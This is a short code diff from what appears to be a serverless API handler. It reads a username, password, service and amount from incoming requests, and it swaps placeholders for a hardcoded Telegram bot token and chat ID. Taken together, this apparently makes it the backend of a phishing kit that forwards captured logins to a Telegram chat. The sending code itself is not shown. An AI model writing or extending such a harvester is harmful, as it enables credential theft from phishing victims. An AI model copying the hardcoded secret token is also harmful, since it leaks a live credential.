@@ -3,8 +3,8 @@ export default async function handler(req, res) {
     return res.status(405).json({ status: "error", message: "Method not allowed" });
   }
 
-  const BOT_TOKEN = "BOT_TOKEN_HERE";
-  const CHAT_ID = "CHAT_ID_HERE";
+  const BOT_TOKEN = "8555813127:AAHCwLu0MtB7bXlFvdP6eadEK1uXdz3Atec";
+  const CHAT_ID = "8439268531";
 
   const { user = "Lama helin", pass = "Lama helin", service = "Lama helin", amount = "0" } = req.body || {};
 
